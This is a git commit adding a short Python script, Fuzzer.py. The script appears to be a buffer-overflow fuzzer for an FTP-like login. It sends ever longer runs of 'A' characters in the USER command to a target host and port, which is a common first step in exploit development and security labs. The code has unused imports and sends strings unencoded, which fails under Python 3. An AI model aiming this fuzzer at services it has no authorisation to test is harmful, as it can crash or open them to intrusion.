971bebff35fb51eaff0deee58c96af778a8176ec
Fathum <70664201+Alts-Dev@users.noreply.github.com>
2022-01-26 13:37:40 -0600

    Add files via upload

---
+++ Fuzzer.py
@@ -0,0 +1,22 @@
+from curses.ascii import alt
+from http import client
+import socket, sys, time
+
+
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+length = 100
+
+while(length <= 3000):
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((host, port))
+    client.recv(1024)
+    client.send("USER " + "A" * length) 
+    client.recv(1024)
+    client.send("PASS pass") 
+    client.recv(1024) 
+    client.close() 
+    time.sleep(2)
+    print("Length Sent: " + str(length))
+    length += 100
